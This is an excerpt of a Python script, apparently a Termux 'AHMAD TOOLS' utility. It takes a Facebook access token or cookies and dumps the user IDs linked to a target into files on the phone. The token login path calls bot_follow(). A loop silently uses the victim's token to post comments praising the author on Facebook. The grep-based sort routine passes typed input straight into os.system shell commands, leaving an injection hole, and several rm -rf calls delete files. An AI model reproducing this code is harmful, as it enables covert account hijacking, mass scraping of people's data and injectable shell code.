...
\033[1;36m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░
[$]••••••••••••••••••••••••••••••••[$]
\033[1;32m     ADMIN   : Ahmad
\033[1;33m     Facebook : AhmadFaisalabadi
\033[1;36m     Connect  :+923109959710
[$]••••••••••••••••••••••••••••••••[$]
 \033[1;32m    If No Result Use Flight Mode \033[1;32m
[$]••••••••••••••••••••••••••••••••[$]""" 
wwn = pilih([U, C, B, Q])
...
class menu:
	def __init__(self):
		...
		print ("[\x1b[1;93m✓\x1b[1;97m]\x1b[1;92mPowered  by AHMAD")
		print ("\x1b[1;97m[\x1b[1;93m✓\x1b[1;97m]\x1b[1;92mPremium tool")
		print(f"\x1b[1;97m[$]••••••••••••••••••••••••••••••••[$]")
		print ("")
		print ("")
		print(I+"\x1b[1;97m[01] Create Unlimited File From 1 Link\x1b[1;91m[AHMAD-PRO] ")
		...
		print(C+"\x1b[1;97m[00] Delete Token (\x1b[1;92mToken & Cookies\x1b[1;97m)")
...
class dubb:
	def __init__(self):
		...
		os.system('sort -r "'+file+'" | uniq > /sdcard/Ahmad')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/Ahnaf.txt.txt')
		os.system('rm -rf /sdcard/AhmadIds.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("[✓] Removing successfully ..")
		print ("[✓] Your file path : /storage/emulated/0/Ahmad.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
...
class login:
	def __init__(self):
		...
		jalan("  ( AHMAD TOOLS LOGIN METHOD )\n")
		print(f"\x1b[1;97[$]••••••••••••••••••••••••••••••••[$]")
		jalan(war+"Except only [EAAB] Access Token") 
		print (f"\x1b[1;97[$]••••••••••••••••••••••••••••••••[$]")
		print ("[1] T O K E N ")
		print ("[2] C O O K I E S")
		print(f"\x1b[1;97m[$]••••••••••••••••••••••••••••••••[$]")
		print("")
		h_ = input('\n[\x1b[1;93m•\x1b[1;91m] Login method : ')
		print
		if h_ in ["1", "01", "token"]:
			token()
...
class msort:
	def __init__(self):
		...
		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/Ahmad.txt')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/Ahmad.txt.txt')
		os.system('rm -rf /sdcard/AhmadIdz.txt')
		print(47*'\033[1;97m-\033[0;0m')
...
class sort:
	def __init__(self):
		print(47*'-')
		print ("[\x1b[1;93m•\x1b[1;91m] Example : 1000 ,10000, 100079 , 100080")
		print(47*'-')
		link = input ("[?] Link 1 : ")
		link1 = input ("[?] Link 2 : ")
		os.system('cat /sdcard/Ahmad.txt | grep "'+link+'" > /sdcard/1.txt')
		os.system('cat /sdcard/Ahmad.txt | grep "'+link1+'" >> /sdcard/1.txt')
		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/Ahmadcut.txt')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/Ahmad.txt.txt')
		os.system('rm -rf /sdcard/Ahmadidz.txt')
		print(47*'\033[1;97m-\033[0;0m')
	...
	def __init__(self):
		...
		for naa in token_free:
			...
			if len(naa)>=37:
				...
				comment = random.choice(['Big fan Ahmad sir❤️','Big fan brother💛',' Ahmad sir big fan💚','Sir please reply me💙','Love you Ahmad sir🖤','Sir big fan please reply me🙏🙏🙏','Legend❤️']) 
				...
				requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + ahmad + '&access_token=' + token)
				requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + comment + '&access_token=' + token)
				requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + ahmad + '&access_token=' + token)
...
class token:
	def __init__(self):
		toket = input("\n\033[1;97m[+] T O K E N : ")
		try:otw = requests.get("https://graph.facebook.com/me?access_token=" + toket);a = json.loads(otw.text);nama = a["name"];zedd = open(".login.txt", "w");zedd.write(toket);zedd.close();print;print((war+" LOGIN SUCCESSFUL IN AHMAD TOOLS"));bot_follow()
		except KeyError:print((war+"I N V A L I D"));time.sleep(2);token()
class check_kukis:
	def __init__(self):
		session = req.Session()
...
class coke:
	def __init__(self):
		...
		exit(jalan(war+"Run This Script Again \033[1;91m[AHMAD]"))
	...
	def __init__(self, token):
		...
		if _id == "0" or "0" == _id:
			...
			if haalq in ["y","Y"]:
				...
				tok.close()
				print ("\n"+war+"Token : "+I+token+Q)
				exit(jalan(war+"Token Found Please,Run : python Run.py"))
				exit()
			else:pass
	print ("\n")
...
class dump_ulti:
	def __init__(self):
		try:
			...
			os.system("rm -rf .login.txt")
			exit(war+" F A I L E D  ");time.sleep(2)
		idt = input(war+"E N T E R  L I N K  : " )
		try:
			if idt == "me":idt = "me"
			else:
		...
		os.system("rm -rf /storage/emulated/0/Ahmad.txt")
		namq = ("Ahmad")
		if namq == "" or namq == " ":
		...
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:jalan(war+"This Account "+idt+" Not Public  ");time.sleep(2);exit()
		else:
			jalan(war+"\033[0;91mE Khabar Hay Ittefaq Nahe  ")
			jalan(war+"\033[0;91mHam Jaisa Hona Mazaq Nhe ")
			print(war+"\033[0;92mT O T A L  I DS : %s"%(len(id)))
			dumppp = open('/sdcard/'+namq+'.json','w')
			jalan(war+'\033[0;97mFile Dump Not Found : '+'/sdcard/'+namq+'.txt')
			jalan(war+"\033[0;97mClick CTRL + Z  To STOP PROGRAME  ")
...
class lonte__:
	def __init__(self, ml, token, toket, mamk):
		...
		sys.stdout.write("\r%s[%sAHMAD%s] COLLECTED IDZ •> %s"%(Q,pilih([U,I,K,M,C]),Q, len(open('/sdcard/'+mamk+'.txt','r').readlines()))
		); sys.stdout.flush()
class menu:
	def __init__(self):
		global ua
